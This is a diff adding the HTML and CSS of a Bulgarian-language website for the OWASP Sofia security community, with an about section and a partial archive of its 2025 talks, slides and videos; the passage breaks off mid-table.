@@ -1,0 +1,1084 @@
+<!DOCTYPE html>
+<html lang="bg">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OWASP Sofia | България</title>
+    <meta name="description" content="OWASP Sofia - българската OWASP общност. Open Worldwide Application Security Project. Киберсигурност, образование и споделяне на знания.">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        :root {
+            --owasp-header: rgb(152, 175, 199);
+            --owasp-header-dark: rgb(120, 145, 172);
+            --owasp-dark: #233040;
+            --owasp-text: #2d3748;
+            --owasp-text-light: #4a5568;
+            --owasp-bg: #ffffff;
+            --owasp-bg-alt: #f7f8fa;
+            --owasp-border: #e2e8f0;
+            --owasp-accent: #4a90d9;
+            --owasp-accent-hover: #3a7bc8;
+        }
+
+        html { scroll-behavior: smooth; }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            font-weight: 400;
+            color: var(--owasp-text);
+            line-height: 1.6;
+            background: var(--owasp-bg);
+        }
+
+        a { color: var(--owasp-accent); text-decoration: none; transition: color 0.2s; }
+        a:hover { color: var(--owasp-accent-hover); text-decoration: underline; }
+
+        .container { max-width: 1100px; margin: 0 auto; padding: 0 24px; }
+
+        /* ===== SVG Icons ===== */
+        .icon-svg { width: 20px; height: 20px; fill: currentColor; vertical-align: middle; }
+        .icon-svg-sm { width: 16px; height: 16px; fill: currentColor; vertical-align: middle; }
+
+        /* ===== Header ===== */
+        header {
+            background: var(--owasp-header);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+
+        .header-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            max-width: 1100px;
+            margin: 0 auto;
+            height: 64px;
+        }
+
+        .logo-area { display: flex; align-items: center; gap: 12px; text-decoration: none; }
+        .logo-area img { height: 40px; width: auto; }
+        .logo-area span { font-weight: 700; font-size: 1.1rem; color: #fff; letter-spacing: 0.5px; }
+
+        nav { display: flex; gap: 4px; }
+        nav a {
+            color: rgb(35, 48, 64); font-weight: 500; font-size: 0.9rem;
+            padding: 8px 14px; border-radius: 6px;
+            transition: background 0.2s, color 0.2s; text-decoration: none;
+        }
+        nav a:hover { background: rgba(35,48,64,0.15); color: rgb(20, 30, 42); text-decoration: none; }
+
+        .nav-toggle { display: none; background: none; border: none; cursor: pointer; padding: 8px; }
+        .nav-toggle span { display: block; width: 24px; height: 2px; background: #fff; margin: 5px 0; }
+
+        /* ===== Hero ===== */
+        .hero {
+            background: var(--owasp-dark) url('bg.jpg') center center / cover no-repeat;
+            color: #fff;
+            padding: 80px 24px;
+            position: relative;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(ellipse at center, rgba(35,48,64,0.85) 0%, rgba(35,48,64,0.7) 100%);
+        }
+
+        .hero > .container { position: relative; z-index: 1; }
+
+        .hero-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 48px;
+            align-items: center;
+        }
+
+        .hero-text h1 {
+            font-size: 2.6rem;
+            font-weight: 700;
+            margin-bottom: 16px;
+            line-height: 1.2;
+            color: #fff;
+        }
+
+        .hero-text h1 span { color: var(--owasp-header); }
+
+        .hero-text p {
+            font-size: 1.02rem;
+            line-height: 1.8;
+            color: #cbd5e0;
+            margin-bottom: 32px;
+            background: rgba(35, 48, 64, 0.7);
+            padding: 20px 24px;
+            border-radius: 10px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .hero-buttons { display: flex; gap: 16px; flex-wrap: wrap; }
+
+        .hero-stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .hero-stat {
+            background: rgba(255,255,255,0.06);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 10px;
+            padding: 24px;
+        }
+
+        .hero-stat .number {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--owasp-header);
+            line-height: 1;
+            margin-bottom: 6px;
+        }
+
+        .hero-stat .label {
+            font-size: 0.85rem;
+            color: #90a4ae;
+            font-weight: 400;
+        }
+
+        .btn {
+            display: inline-block; padding: 12px 28px; border-radius: 6px;
+            font-weight: 500; font-size: 0.95rem; transition: all 0.2s;
+            text-decoration: none; cursor: pointer; border: none;
+        }
+        .btn-primary { background: var(--owasp-accent); color: #fff; }
+        .btn-primary:hover { background: var(--owasp-accent-hover); color: #fff; text-decoration: none; }
+        .btn-outline { border: 2px solid var(--owasp-header); color: var(--owasp-header); background: rgba(35, 48, 64, 0.7); }
+        .btn-outline:hover { background: var(--owasp-header); color: var(--owasp-dark); text-decoration: none; }
+
+/* ===== Sections ===== */
+        section { padding: 64px 0; }
+        section:nth-child(even) { background: var(--owasp-bg-alt); }
+
+        .section-title { font-size: 1.8rem; font-weight: 700; margin-bottom: 12px; color: var(--owasp-dark); }
+        .section-desc { color: var(--owasp-text-light); margin-bottom: 40px; max-width: 650px; }
+
+        /* ===== About Grid ===== */
+        .about-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 32px; }
+        .about-card { background: #fff; border: 1px solid var(--owasp-border); border-radius: 10px; padding: 32px; }
+        .about-card h3 { font-size: 1.15rem; font-weight: 700; margin-bottom: 12px; color: var(--owasp-dark); }
+        .about-card p, .about-card li { color: var(--owasp-text-light); font-size: 0.95rem; line-height: 1.7; }
+        .about-card ul { list-style: none; padding: 0; }
+        .about-card ul li { padding: 6px 0 6px 20px; position: relative; }
+        .about-card ul li::before { content: "\2022"; color: var(--owasp-accent); font-weight: 700; position: absolute; left: 0; }
+
+        /* ===== Events Table ===== */
+        .events-table {
+            width: 100%; border-collapse: collapse; background: #fff;
+            border-radius: 10px; overflow: hidden; border: 1px solid var(--owasp-border);
+        }
+        .events-table thead { background: var(--owasp-header); color: #fff; }
+        .events-table th { padding: 14px 16px; text-align: left; font-weight: 500; font-size: 0.9rem; }
+        .events-table td { padding: 12px 16px; font-size: 0.9rem; border-bottom: 1px solid var(--owasp-border); vertical-align: top; }
+        .events-table tbody tr:hover { background: #f0f4f8; }
+        .events-table .year-row td { background: var(--owasp-dark); color: #fff; font-weight: 700; font-size: 1rem; padding: 10px 16px; }
+
+        .badge {
+            display: inline-block; padding: 3px 10px; border-radius: 12px;
+            font-size: 0.75rem; font-weight: 500; text-decoration: none;
+        }
+        .badge-video { background: #e6f4ea; color: #1a7f37; }
+        .badge-video:hover { background: #d0e8d4; text-decoration: none; }
+        .badge-slides { background: #e8f0fe; color: #1a56db; }
+        .badge-slides:hover { background: #d0e0f8; text-decoration: none; }
+
+        .author-link { color: var(--owasp-text); text-decoration: none; }
+        .author-link:hover { color: var(--owasp-accent); text-decoration: underline; }
+        .author-link .icon-svg-sm { opacity: 0.5; margin-left: 3px; }
+        .author-link:hover .icon-svg-sm { opacity: 1; }
+
+        /* ===== Resources Grid ===== */
+        .resources-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 24px; }
+        .resource-card {
+            background: #fff; border: 1px solid var(--owasp-border); border-radius: 10px;
+            padding: 28px; transition: box-shadow 0.2s, transform 0.2s;
+        }
+        .resource-card:hover { box-shadow: 0 4px 16px rgba(0,0,0,0.08); transform: translateY(-2px); }
+        .resource-card h3 { font-size: 1.05rem; font-weight: 700; margin-bottom: 8px; color: var(--owasp-dark); }
+        .resource-card p { font-size: 0.9rem; color: var(--owasp-text-light); margin-bottom: 12px; line-height: 1.6; }
+        .resource-card .link { font-size: 0.85rem; font-weight: 500; }
+
+        .lang-badge { display: inline-block; padding: 3px 10px; border-radius: 4px; font-size: 0.75rem; font-weight: 500; margin-right: 8px; }
+        .lang-bg { background: #e8f5e9; color: #2e7d32; }
+        .lang-en { background: #e3f2fd; color: #1565c0; }
+
+        /* ===== Leaders ===== */
+        .leaders-grid { display: grid; grid-template-columns: repeat(3, 220px); gap: 24px; justify-content: center; }
+        .leader-card {
+            background: #fff; border: 1px solid var(--owasp-border); border-radius: 10px;
+            padding: 28px; text-align: center;
+        }
+        .leader-icon {
+            width: 64px; height: 64px; border-radius: 50%;
+            background: var(--owasp-header); margin: 0 auto 16px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1.3rem; color: #fff; font-weight: 700;
+        }
+        .leader-card h3 { font-size: 1rem; font-weight: 700; color: var(--owasp-dark); margin-bottom: 4px; }
+        .leader-card p { font-size: 0.85rem; color: var(--owasp-text-light); margin-bottom: 12px; }
+        .leader-links { display: flex; gap: 12px; justify-content: center; }
+        .leader-links a {
+            display: inline-flex; align-items: center; justify-content: center;
+            width: 36px; height: 36px; border-radius: 50%;
+            background: var(--owasp-bg-alt); color: var(--owasp-text-light);
+            transition: all 0.2s; text-decoration: none;
+        }
+        .leader-links a:hover { background: var(--owasp-accent); color: #fff; text-decoration: none; }
+
+        /* ===== Contact Cards ===== */
+        .contact-links { display: grid; grid-template-columns: repeat(6, 1fr); gap: 16px; }
+        .contact-card {
+            background: #fff; border: 1px solid var(--owasp-border);
+            border-radius: 10px; padding: 24px; text-align: center;
+            transition: box-shadow 0.2s; text-decoration: none; color: inherit;
+        }
+        .contact-card:hover { box-shadow: 0 4px 16px rgba(0,0,0,0.08); text-decoration: none; }
+        .contact-card .icon { font-size: 2rem; margin-bottom: 12px; }
+        .contact-card h3 { font-size: 1rem; font-weight: 700; margin-bottom: 4px; color: var(--owasp-dark); }
+        .contact-card p { font-size: 0.85rem; color: var(--owasp-text-light); }
+
+        /* ===== Footer ===== */
+        footer { background: var(--owasp-dark); color: #a0aec0; padding: 40px 0; font-size: 0.85rem; }
+        .footer-inner { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; }
+        footer a { color: var(--owasp-header); }
+        footer a:hover { color: #fff; }
+        .footer-social { display: flex; gap: 16px; align-items: center; }
+        .footer-social a {
+            display: inline-flex; align-items: center; justify-content: center;
+            width: 32px; height: 32px; border-radius: 50%;
+            background: rgba(255,255,255,0.1); color: var(--owasp-header);
+            transition: all 0.2s; text-decoration: none;
+        }
+        .footer-social a:hover { background: var(--owasp-accent); color: #fff; text-decoration: none; }
+
+        /* ===== Partners Grid ===== */
+        .partners-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+        .partner-card {
+            background: #fff; border: 1px solid var(--owasp-border); border-radius: 10px;
+            padding: 24px; transition: box-shadow 0.2s;
+            text-decoration: none; color: inherit;
+        }
+        .partner-card:hover { box-shadow: 0 4px 16px rgba(0,0,0,0.08); text-decoration: none; }
+        .partner-card h3 { font-size: 0.95rem; font-weight: 700; color: var(--owasp-dark); margin-bottom: 6px; }
+        .partner-card p { font-size: 0.82rem; color: var(--owasp-text-light); line-height: 1.5; }
+
+        /* ===== Accordion ===== */
+        .accordion { }
+        .accordion-item {
+            border: 1px solid var(--owasp-border);
+            border-radius: 10px;
+            margin-bottom: 8px;
+            background: #fff;
+            overflow: hidden;
+        }
+        .accordion-header {
+            width: 100%;
+            background: none;
+            border: none;
+            padding: 16px 20px;
+            font-family: 'Roboto', sans-serif;
+            font-size: 0.95rem;
+            font-weight: 500;
+            color: var(--owasp-dark);
+            text-align: left;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: background 0.2s;
+        }
+        .accordion-header:hover { background: var(--owasp-bg-alt); }
+        .accordion-header .acc-code {
+            background: var(--owasp-header);
+            color: #fff;
+            padding: 3px 10px;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+        .accordion-header .acc-arrow {
+            margin-left: auto;
+            transition: transform 0.2s;
+            font-size: 0.8rem;
+            color: var(--owasp-text-light);
+        }
+        .accordion-item.open .acc-arrow { transform: rotate(180deg); }
+        .accordion-body {
+            display: none;
+            padding: 0 20px 16px 20px;
+            font-size: 0.9rem;
+            color: var(--owasp-text-light);
+            line-height: 1.7;
+        }
+        .accordion-item.open .accordion-body { display: block; }
+        .accordion-body a { font-size: 0.85rem; }
+
+        /* ===== Responsive ===== */
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2rem; }
+            .hero { padding: 48px 24px; }
+            .hero-grid { grid-template-columns: 1fr; gap: 32px; }
+            .hero-stats { grid-template-columns: 1fr 1fr; }
+            .about-grid { grid-template-columns: 1fr; }
+            .nav-toggle { display: block; }
+            nav {
+                display: none; position: absolute; top: 64px; left: 0; right: 0;
+                background: var(--owasp-header); flex-direction: column; padding: 16px;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            }
+            nav.open { display: flex; }
+            nav a { padding: 12px 16px; }
+            .events-table { font-size: 0.8rem; }
+            .events-table th, .events-table td { padding: 8px 10px; }
+            .footer-inner { flex-direction: column; text-align: center; }
+            .contact-links { grid-template-columns: repeat(3, 1fr); }
+            .partners-grid { grid-template-columns: repeat(3, 1fr); }
+            .footer-social { justify-content: center; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- SVG sprite (hidden) -->
+<svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+    <symbol id="icon-linkedin" viewBox="0 0 24 24">
+        <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
+    </symbol>
+    <symbol id="icon-email" viewBox="0 0 24 24">
+        <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+    </symbol>
+    <symbol id="icon-facebook" viewBox="0 0 24 24">
+        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+    </symbol>
+    <symbol id="icon-slack" viewBox="0 0 24 24">
+        <path d="M5.042 15.165a2.528 2.528 0 0 1-2.52 2.523A2.528 2.528 0 0 1 0 15.165a2.527 2.527 0 0 1 2.522-2.52h2.52v2.52zm1.271 0a2.527 2.527 0 0 1 2.521-2.52 2.527 2.527 0 0 1 2.521 2.52v6.313A2.528 2.528 0 0 1 8.834 24a2.528 2.528 0 0 1-2.521-2.522v-6.313zM8.834 5.042a2.528 2.528 0 0 1-2.521-2.52A2.528 2.528 0 0 1 8.834 0a2.528 2.528 0 0 1 2.521 2.522v2.52H8.834zm0 1.271a2.528 2.528 0 0 1 2.521 2.521 2.528 2.528 0 0 1-2.521 2.521H2.522A2.528 2.528 0 0 1 0 8.834a2.528 2.528 0 0 1 2.522-2.521h6.312zm10.122 2.521a2.528 2.528 0 0 1 2.522-2.521A2.528 2.528 0 0 1 24 8.834a2.528 2.528 0 0 1-2.522 2.521h-2.522V8.834zm-1.268 0a2.528 2.528 0 0 1-2.523 2.521 2.527 2.527 0 0 1-2.52-2.521V2.522A2.527 2.527 0 0 1 15.165 0a2.528 2.528 0 0 1 2.523 2.522v6.312zm-2.523 10.122a2.528 2.528 0 0 1 2.523 2.522A2.528 2.528 0 0 1 15.165 24a2.527 2.527 0 0 1-2.52-2.522v-2.522h2.52zm0-1.268a2.527 2.527 0 0 1-2.52-2.523 2.526 2.526 0 0 1 2.52-2.52h6.313A2.527 2.527 0 0 1 24 15.165a2.528 2.528 0 0 1-2.522 2.523h-6.313z"/>
+    </symbol>
+    <symbol id="icon-discord" viewBox="0 0 24 24">
+        <path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189z"/>
+    </symbol>
+    <symbol id="icon-github" viewBox="0 0 24 24">
+        <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/>
+    </symbol>
+    <symbol id="icon-web" viewBox="0 0 24 24">
+        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+    </symbol>
+    <symbol id="icon-meetup" viewBox="0 0 24 24">
+        <path d="M6.98.555a.518.518 0 00-.105.011.53.53 0 00-.412.633l.455 2.078a.534.534 0 00.634.413.534.534 0 00.412-.636L7.51.976A.533.533 0 006.98.555zm10.02.555a.528.528 0 00-.519.42l-.454 2.078a.533.533 0 00.412.634.53.53 0 00.633-.41l.454-2.08A.533.533 0 0017.11.976a.518.518 0 00-.11-.011v.145-.145zM12 2.378c-5.26 0-9.524 4.264-9.524 9.524 0 5.26 4.264 9.524 9.524 9.524 5.26 0 9.524-4.264 9.524-9.524 0-5.26-4.264-9.524-9.524-9.524zm0 1.063c4.681 0 8.46 3.78 8.46 8.461 0 4.681-3.779 8.46-8.46 8.46-4.681 0-8.46-3.779-8.46-8.46 0-4.681 3.779-8.46 8.46-8.46zm-3.2 3.18a2.159 2.159 0 00-2.1 1.665l-.9 3.96c-.236 1.038.573 2.028 1.64 2.028.726 0 1.36-.479 1.564-1.175l.855-2.924c.08-.274.465-.274.545 0l.855 2.924A1.63 1.63 0 0012.823 14.3c.726 0 1.36-.479 1.564-1.175l.855-2.924c.08-.274.465-.274.545 0l.855 2.924a1.63 1.63 0 001.564 1.175c1.067 0 1.876-.99 1.64-2.028l-.9-3.96a2.159 2.159 0 00-2.1-1.665H8.8z"/>
+    </symbol>
+</svg>
+
+<!-- ===== Header ===== -->
+<header>
+    <div class="header-inner">
+        <a href="#" class="logo-area">
+            <img src="https://owasp.org/assets/images/logo.png" alt="OWASP лого">
+        </a>
+        <button class="nav-toggle" aria-label="Меню" onclick="document.querySelector('nav').classList.toggle('open')">
+            <span></span><span></span><span></span>
+        </button>
+        <nav>
+            <a href="#за-нас">За нас</a>
+            <a href="#събития">Събития</a>
+            <a href="#ресурси">Ресурси</a>
+            <a href="#top10">Top 10</a>
+            <a href="#екип">Екип</a>
+            <a href="#контакти">Контакти</a>
+        </nav>
+    </div>
+</header>
+
+<!-- ===== Hero ===== -->
+<section class="hero">
+    <div class="container">
+        <div class="hero-grid">
+            <div class="hero-text">
+                <h1>OWASP <span>Sofia</span></h1>
+                <p>
+                    Първата българска OWASP общност &mdash; част от <strong style="color:#fff;">OWASP</strong> (Open Worldwide
+                    Application Security Project) &mdash; глобална нестопанска организация, посветена на
+                    подобряването на сигурността на софтуера. Обединяваме ентусиасти, професионалисти и
+                    експерти по киберсигурност с мисията да направим дигиталния свят по-сигурен чрез
+                    образование, споделяне на знания и отворено сътрудничество.
+                </p>
+                <div class="hero-buttons">
+                    <a href="https://www.meetup.com/OWASP-Sofia-Chapter/" target="_blank" rel="noopener" class="btn btn-primary">Следващо събитие</a>
+                    <a href="#събития" class="btn btn-outline">Минали събития</a>
+                </div>
+            </div>
+            <div class="hero-stats">
+                <div class="hero-stat">
+                    <div class="number">25+</div>
+                    <div class="label">Презентации</div>
+                </div>
+                <div class="hero-stat">
+                    <div class="number">30+</div>
+                    <div class="label">Лектори</div>
+                </div>
+                <div class="hero-stat">
+                    <div class="number">6</div>
+                    <div class="label">Години</div>
+                </div>
+                <div class="hero-stat">
+                    <div class="number">100%</div>
+                    <div class="label">Безплатно и отворено</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== За нас ===== -->
+<section id="за-нас">
+    <div class="container">
+        <h2 class="section-title">Какво е OWASP?</h2>
+        <p class="section-desc">Запознайте се с организацията и нашата мисия в България.</p>
+        <div class="about-grid">
+            <div class="about-card">
+                <h3>OWASP Foundation</h3>
+                <p>
+                    OWASP е международна нестопанска организация, създадена през 2001 г., чиято цел е
+                    софтуерната сигурност да бъде видима и достъпна за всички. Всички материали са безплатни
+                    и с отворен достъп &mdash; инструменти, документация, стандарти и стотици глави по целия свят.
+                </p>
+                <p style="margin-top:12px;">
+                    <a href="https://owasp.org/" target="_blank" rel="noopener">owasp.org &rarr;</a>
+                </p>
+            </div>
+            <div class="about-card">
+                <h3>OWASP Sofia &mdash; нашата мисия</h3>
+                <p>Като първата OWASP общност в България, ние:</p>
+                <ul>
+                    <li>Организираме редовни срещи с презентации и дискусии</li>
+                    <li>Популяризираме най-добрите практики в сигурността</li>
+                    <li>Споделяме знания и опит между професионалисти</li>
+                    <li>Превеждаме ключови OWASP ресурси на български</li>
+                    <li>Изграждаме мост между глобалната общност и България</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== Събития ===== -->
+<section id="събития">
+    <div class="container">
+        <h2 class="section-title">Събития</h2>
+        <p class="section-desc">Архив на минали презентации с линкове към записи и материали.</p>
+        <table class="events-table">
+            <thead>
+                <tr>
+                    <th>Дата</th>
+                    <th>Тема</th>
+                    <th>Лектор</th>
+                    <th>Ресурси</th>
+                </tr>
+            </thead>
+            <tbody>
+                <!-- 2025 -->
+                <tr class="year-row"><td colspan="4">2025</td></tr>
+                <tr>
+                    <td>10.12.2025</td>
+                    <td><a href="./assets/presentations/202512%20-%20OWASP%20Top%2010%202025%20by%20Miglen%20Evlogiev.pdf">OWASP Top 10:2025</a></td>
+                    <td><a href="https://www.linkedin.com/in/miglen/" target="_blank" rel="noopener" class="author-link">Miglen Evlogiev <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://youtu.be/Bs_d1cUWr8E?si=qInFK_F8DK3RCMTi&t=2181" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>10.12.2025</td>
+                    <td><a href="./assets/presentations/202512%20-%20Metrics%20in%20Cybersecurity%20-%20Effective%20vs%20Ineffective%20Reporting%20by%20Ionko%20Ionkoff.pdf">Metrics in Cybersecurity &mdash; Effective vs Non-effective reporting</a></td>
+                    <td><a href="https://www.linkedin.com/in/ionko-ionkoff/" target="_blank" rel="noopener" class="author-link">Ionko Ionkoff <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://youtu.be/Bs_d1cUWr8E?si=qInFK_F8DK3RCMTi&t=2181" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>10.12.2025</td>
+                    <td><a href="./assets/presentations/202512%20-%20Software%20Supply%20Chain%20Presentation%20by%20Kostadin%20Ivanov.pdf">Software Supply Chain Security Explained</a></td>
+                    <td><a href="https://www.linkedin.com/in/1v4nov/" target="_blank" rel="noopener" class="author-link">Kostadin Ivanov <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://youtu.be/Bs_d1cUWr8E?si=qInFK_F8DK3RCMTi&t=2181" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>16.10.2025</td>
+                    <td><a href="./assets/presentations/202510%20-%20AWS%20Security%20services%20and%20cloud%20compliances%20by%20Ivica%20Micev.pdf">AWS Security services and cloud compliances</a></td>
+                    <td><a href="https://www.linkedin.com/in/ivica-micev-2420645/" target="_blank" rel="noopener" class="author-link">Ivica Micev <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://youtu.be/Pty_7237baA" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>16.10.2025</td>
+                    <td><a href="./assets/presentations/202510%20-%20It's%20not%20DNS.%20There's%20no%20way%20it's%20DNS.%20It%20was%20DNS.%20by%20Presian%20Yankulov.pdf">It's not DNS. There's no way it's DNS. It was DNS.</a></td>
+                    <td><a href="https://www.linkedin.com/in/presian-yankulov-b3b25b1a9/" target="_blank" rel="noopener" class="author-link">Presian Yankulov <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://youtu.be/Pty_7237baA" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>16.10.2025</td>
+                    <td><a href="./assets/presentations/202510%20-%20Introduction%20to%20binary%20exploitation%20by%20Simeon%20Nguen.pdf">Introduction to binary exploitation</a></td>
+                    <td><a href="https://www.linkedin.com/in/thenguen/" target="_blank" rel="noopener" class="author-link">Simeon Nguen <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://youtu.be/Pty_7237baA" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>28.05.2025</td>
+                    <td><a href="./assets/presentations/202505%20-%20How%20to%20fail%20with%20.NET%20reflection%20101%20by%20Ivan%20Ivanov.pdf">How to fail with .NET reflection 101</a></td>
+                    <td>Ivan Ivanov</td>
+                    <td><a href="https://youtu.be/P1_o0204OPk" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>28.05.2025</td>
+                    <td><a href="./assets/presentations/202505%20-%20Effective%20Threat%20Modelling%20by%20Yordan%20Popov%20(Dan%20Ny).pdf">Effective Threat Modelling</a></td>
+                    <td><a href="https://www.linkedin.com/in/dan-ny/" target="_blank" rel="noopener" class="author-link">Yordan Popov (Dan Ny) <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://youtu.be/P1_o0204OPk" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>28.05.2025</td>
+                    <td><a href="./assets/presentations/202505%20-%20Scoring%20Vulnerabilities%20using%20CVSS%20by%20Martin%20Georgiev.pdf">Scoring Vulnerabilities using CVSS</a></td>
+                    <td><a href="https://www.linkedin.com/in/martin-georgiev/" target="_blank" rel="noopener" class="author-link">Martin Georgiev <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://youtu.be/P1_o0204OPk" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>21.03.2025</td>
